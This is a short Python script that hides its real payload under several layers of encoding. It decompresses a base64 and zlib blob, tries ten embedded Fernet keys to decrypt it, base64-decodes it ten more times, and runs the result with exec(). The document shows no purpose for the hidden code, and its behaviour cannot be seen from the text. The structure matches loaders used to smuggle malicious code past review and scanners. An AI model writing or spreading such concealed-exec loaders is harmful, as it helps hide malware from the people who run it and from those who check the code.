
    import base64
    import zlib
    from cryptography.fernet import Fernet

    sk = ['Rb4krQ0vK106uA066HfaIrVcDwReMgBLTdnc7jRpXmc=', 'Q2yO5ULgeQ6Shl7EH5zTf4oryMUCNPznlT9-8N74bgo=', 'SVp6F29XzB26_7j8rOUEuAxKpqfoKjJe0zXXujpt8Zc=', 'QVnivpaGY071DTRc4YM928sDxWBM_24uFsI5Inuapkg=', '6pgGFK3NGQ7Zq6DYQhAyoJlVAA9vC6qifnomGlF_olk=', 'KgMLGFmJW2mfN-UTvhiT0bea0ye0Emm6qOgugeojS10=', '3C69WC3Q2a3UEmOE36msypTO1xWLAhDjktWMh3b4Iz8=', 'MRoEZFoX-gQTSsiCLHEvAs4oW_uFpZAawzzd_8U-9LY=', 'EpTZC9ME3OQbJIRPIBRVoqXwXDXROq3zEiysTQu4TSk=', 'bkg_YPeDd_cjw9D9YfLh8_8DT39Toflm5YcpA-yc3l0=']
    code ='eJxLdwQBp7yCgvKs9FTd5KrsQNP00mCzPK8MI2fHML+CIm/TirKggLQQP/dUCxO3qMhwI1/T3FwD3wCjjJwkH8/EVN2I7DKfpAK/8iQ/R4OQNP9wgyAjM/+U4rx4k2CDgHJbWwCXfiDj'

    def dm(encrypted_text, key):
        fernet = Fernet(key)
        decrypted = fernet.decrypt(encrypted_text)
        return decrypted.decode()

    code = base64.b64decode(code)
    code = zlib.decompress(code).decode('utf-8')

    for x in range(len(sk)):
        try:

            code = dm(code,sk[x])
            break
        except:
            pass
    for x in range(10):
        code = base64.b64decode(code)


    exec(code)


    